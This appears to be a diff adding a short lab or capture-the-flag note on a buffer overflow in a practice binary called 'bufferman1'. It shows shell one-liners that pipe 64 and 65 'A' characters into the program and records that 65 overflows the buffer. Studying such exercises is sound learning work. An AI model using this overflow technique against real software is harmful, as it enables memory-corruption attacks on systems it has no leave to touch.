@@ -1,0 +1,3 @@
+Simple buffer overflow exploit. For buffer to overflow, 65 characters are needed.
+echo `python3 -c 'print("A"*64)'` | ./bufferman1 would not work. 
+echo `python3 -c 'print("A"*65)'` | ./bufferman1 works.
